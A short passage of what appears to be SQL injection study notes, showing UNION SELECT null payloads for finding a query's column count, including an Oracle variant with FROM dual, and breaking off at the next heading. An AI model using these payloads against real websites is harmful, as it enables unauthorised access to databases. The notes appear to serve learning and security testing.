### UNION attack to determine number of columns
```sql
'' UNION SELECT null, null, null... -- 
```
Add/remove nulls until you don't receive an error message from the page. 

**Oracle DB requires you to specify a table to select data from, even if you are trying to select null values.** In this case your query should look like:
```sql
'' UNION SELECT null, null, null... FROM dual --
```

### Once number of columns are determined
